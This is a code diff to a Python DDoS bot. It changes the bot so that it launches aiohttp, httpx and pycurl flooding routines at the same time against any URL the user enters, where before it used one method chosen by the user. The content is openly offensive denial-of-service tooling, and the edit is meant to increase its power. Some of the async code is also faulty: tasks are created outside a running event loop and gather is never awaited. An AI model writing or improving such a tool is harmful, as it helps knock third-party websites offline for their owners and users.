@@ -5,10 +5,9 @@ import threading
 import asyncio
 
 class DDoSBot:
-    def __init__(self, url, method='aiohttp'):
+    def __init__(self, url):
         self.url = url
         self.is_active = True
-        self.method = method
 
     async def aiohttp_attack(self):
         async with aiohttp.ClientSession() as session:
@@ -37,18 +36,17 @@ class DDoSBot:
             c.close()
 
     def start_attack(self):
-        if self.method == 'aiohttp':
-            tasks = [asyncio.create_task(self.aiohttp_attack())]
-        elif self.method == 'httpx':
-            tasks = [asyncio.create_task(self.httpx_attack())]
-        else:
-            tasks = [asyncio.run(self.pycurl_attack())]
-        asyncio.gather(*tasks)
+        tasks = [
+            asyncio.create_task(self.aiohttp_attack()),
+            asyncio.create_task(self.httpx_attack()),
+            threading.Thread(target=self.pycurl_attack)
+        ]
+        tasks[2].start()
+        asyncio.gather(*tasks[:2])
 
 def main():
     url = input("Enter the target URL: ")
-    method = input("Enter the method (aiohttp, httpx, pycurl): ")
-    bot = DDoSBot(url, method)
+    bot = DDoSBot(url)
     bot.start_attack()
 
 if __name__ == "__main__":
